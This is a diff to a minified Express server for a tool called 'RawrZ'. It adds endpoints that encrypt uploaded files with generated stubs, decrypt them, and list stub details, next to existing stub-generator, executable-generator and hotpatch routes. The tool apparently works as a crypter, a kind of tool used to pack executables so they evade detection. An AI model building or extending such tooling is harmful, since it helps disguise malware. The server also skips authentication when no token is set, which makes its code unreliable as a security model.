@@ -1,6 +1,6 @@
 const express=require('express');const cors=require('cors');const helmet=require('helmet');const path=require('path');const multer=require('multer');require('dotenv').config();
-const RawrZStandalone=require('./rawrz-standalone');const rawrzEngine=require('./src/engines/rawrz-engine');
-const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();
+const RawrZStandalone=require('./rawrz-standalone');const rawrzEngine=require('./src/engines/rawrz-engine');const RawrZEncryptorOnly=require('./rawrz-encryptor-only');
+const app=express();const port=parseInt(process.env.PORT||'8080',10);const authToken=process.env.AUTH_TOKEN||'';const rawrz=new RawrZStandalone();const encryptorOnly=new RawrZEncryptorOnly();
 function requireAuth(req,res,next){if(!authToken)return next();const h=(req.headers['authorization']||'');const q=req.query.token;if(h.startsWith('Bearer ')){const p=h.slice(7).trim();if(p===authToken)return next()}if(q&&q===authToken)return next();return res.status(401).json({error:'Unauthorized'})}
 const upload=multer({dest:'uploads/'});app.use(helmet());app.use(cors());app.use(express.json({limit:'5mb'}));app.use('/static',express.static(path.join(__dirname,'public')));
 (async()=>{try{await rawrzEngine.initializeModules();console.log('[OK] RawrZ core engine initialized')}catch(e){console.error('[WARN] Core engine init failed:',e.message)}})();
@@ -13,6 +13,7 @@ app.get('/executable-generator',(_req,res)=>res.sendFile(path.join(__dirname,'pu
 app.get('/terminal',(_req,res)=>res.sendFile(path.join(__dirname,'public','rawrz-terminal.html')));
 app.get('/stub-generator',(_req,res)=>res.sendFile(path.join(__dirname,'public','stub-generator.html')));
 app.get('/encryption-with-stubs',(_req,res)=>res.sendFile(path.join(__dirname,'public','encryption-with-stub-selection.html')));
+app.get('/encryptor-only',(_req,res)=>res.sendFile(path.join(__dirname,'public','encryptor-only.html')));
 app.get('/',(_req,res)=>res.redirect('/encrypt'));
 // Text encryption/decryption removed - file operations only
 app.get('/dns',requireAuth,async(req,res)=>{try{const h=req.query.hostname;if(!h)return res.status(400).json({error:'hostname required'});res.json(await rawrz.dnsLookup(String(h)))}catch(e){res.status(500).json({error:e.message})}});
@@ -26,6 +27,10 @@ app.post('/api/generate-executable',requireAuth,async(req,res)=>{try{const{name,
 app.post('/api/test-compilation',requireAuth,async(req,res)=>{try{const{code,compiler}=req.body||{};if(!code)return res.status(400).json({error:'code required'});res.json({success:true,message:'Compilation test passed'})}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/generate-stub',requireAuth,async(req,res)=>{try{const{name,type,platform,compiler,options}=req.body||{};if(!name||!type||!platform||!compiler)return res.status(400).json({error:'name, type, platform, and compiler required'});const result=await rawrz.generateStub(name,type,platform,compiler,options);res.json(result)}catch(e){res.status(500).json({error:e.message})}});
 app.post('/api/apply-hotpatch',requireAuth,async(req,res)=>{try{const{stubPath,patchType,options}=req.body||{};if(!stubPath||!patchType)return res.status(400).json({error:'stubPath and patchType required'});const result=await rawrz.applyHotPatch(stubPath,patchType,options);res.json(result)}catch(e){res.status(500).json({error:e.message})}});
+app.post('/api/encrypt-with-generated-stub',requireAuth,upload.single('file'),async(req,res)=>{try{const{algorithm,extension,stubPath}=req.body||{};const file=req.file;if(!file)return res.status(400).json({error:'file required'});if(!stubPath)return res.status(400).json({error:'stubPath required - must use generated stub'});const result=await encryptorOnly.encryptFileWithGeneratedStub(file,algorithm,extension,stubPath);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.post('/api/decrypt-with-generated-stub',requireAuth,async(req,res)=>{try{const{encryptedFilePath,stubPath,options}=req.body||{};if(!encryptedFilePath||!stubPath)return res.status(400).json({error:'encryptedFilePath and stubPath required'});const result=await encryptorOnly.decryptFileWithGeneratedStub(encryptedFilePath,stubPath,options);res.json({success:true,result})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/api/list-generated-stubs',requireAuth,async(req,res)=>{try{const stubs=await encryptorOnly.listAvailableStubs();res.json({success:true,stubs})}catch(e){res.status(500).json({error:e.message})}});
+app.get('/api/stub-info',requireAuth,async(req,res)=>{try{const{stubName}=req.query||{};if(!stubName)return res.status(400).json({error:'stubName required'});const info=await encryptorOnly.getStubInfo(stubName);res.json({success:true,info})}catch(e){res.status(500).json({error:e.message})}});
 
 // Text encryption endpoints removed - file operations only
 
